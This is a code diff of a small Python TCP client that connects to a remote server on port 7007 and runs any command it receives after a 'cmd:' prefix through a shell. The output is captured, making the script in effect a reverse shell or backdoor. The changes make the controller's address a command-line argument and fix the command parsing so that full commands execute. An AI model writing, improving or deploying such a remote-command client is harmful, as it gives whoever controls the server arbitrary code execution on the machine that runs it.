@@ -1,13 +1,15 @@
 import socket
 import subprocess
 from pathlib import Path
+import sys
 
 def tcp_client():
     print("client starting")
     client_socket = socket.socket()
 
     try:
-        server_address = ("192.168.70.6", 7007)
+        host = sys.argv[1] if len(sys.argv) > 1 else "192.168.70.6"
+        server_address = (host, 7007)
         client_socket.connect(server_address)
         print("connected")
 
@@ -15,7 +17,7 @@ def tcp_client():
             header = client_socket.recv(1024).decode("utf-8").strip()
 
             if header.startswith("cmd:"):
-                _, command = header.split(":")
+                command = header[4:]
                 print(command)
                 result = subprocess.run(command, shell=True, capture_output=True, text=True)
                 output = result.stdout + result.stderr
